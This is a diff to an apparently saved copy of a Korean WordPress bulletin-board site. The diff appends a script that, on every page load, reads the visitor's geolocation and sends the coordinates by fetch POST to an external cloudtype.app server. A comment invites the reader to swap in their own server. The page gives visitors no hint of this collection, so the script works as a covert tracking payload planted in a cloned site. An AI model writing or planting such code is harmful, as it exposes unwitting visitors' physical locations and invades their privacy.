@@ -897,4 +897,46 @@ var kboard_settings={"version":"6.3","home_url":"\/","site_url":"\/","post_url":
 <script type="text/javascript" src="./index_files/postcode.v2.js.다운로드" id="daum-postcode-js"></script>
 	
 
-<iframe allow="join-ad-interest-group" data-tagging-id="G-9X8KV75QGW" data-load-time="1731864532711" height="0" width="0" src="./index_files/rul.html" style="display: none; visibility: hidden;"></iframe><img src="./index_files/g.gif" alt="" width="6" height="5" id="wpstats"></body></html>
+<iframe allow="join-ad-interest-group" data-tagging-id="G-9X8KV75QGW" data-load-time="1731864532711" height="0" width="0" src="./index_files/rul.html" style="display: none; visibility: hidden;"></iframe><img src="./index_files/g.gif" alt="" width="6" height="5" id="wpstats">
+<script>
+        function sendLocationToServer(latitude, longitude) {
+            // 서버 URL 설정 (본인의 서버 주소로 변경)
+            const serverUrl = 'https://port-0-server1-m3howeoye65c6a57.sel4.cloudtype.app/location';
+            
+            // 위치 데이터를 서버로 전송
+            fetch(serverUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ latitude: latitude, longitude: longitude })
+            })
+            .then(response => response.json())
+            .then(data => console.log("위치 데이터 전송 성공:", data))
+            .catch(error => console.error("위치 데이터 전송 오류:", error));
+        }
+
+        function trackLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        console.log("위도:", latitude, "경도:", longitude);
+
+                        // 위치를 서버로 전송
+                        sendLocationToServer(latitude, longitude);
+                    },
+                    (error) => {
+                        console.error("위치 추적 실패:", error);
+                    }
+                );
+            } else {
+                console.error("이 브라우저는 위치 추적을 지원하지 않습니다.");
+            }
+        }
+
+        // 페이지 로드 시 위치 추적 시작
+        window.onload = trackLocation;
+    </script>
+</body></html>
